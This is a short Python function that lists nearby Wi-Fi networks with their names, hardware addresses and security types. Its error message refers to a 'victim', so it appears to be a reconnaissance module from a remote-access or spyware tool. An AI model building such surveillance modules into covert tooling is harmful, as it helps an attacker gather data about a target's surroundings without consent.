from access_points import get_scanner


def wifi_scanner():
    try:
        wifi_scan = get_scanner()

        result = ""
        for access_point in wifi_scan.get_access_points():
            result += f"{access_point.ssid}  {access_point.bssid}  {access_point.security}\n----------\n"

        return result

    except:
        return "⚠️ Victim does not have wifi enabled."
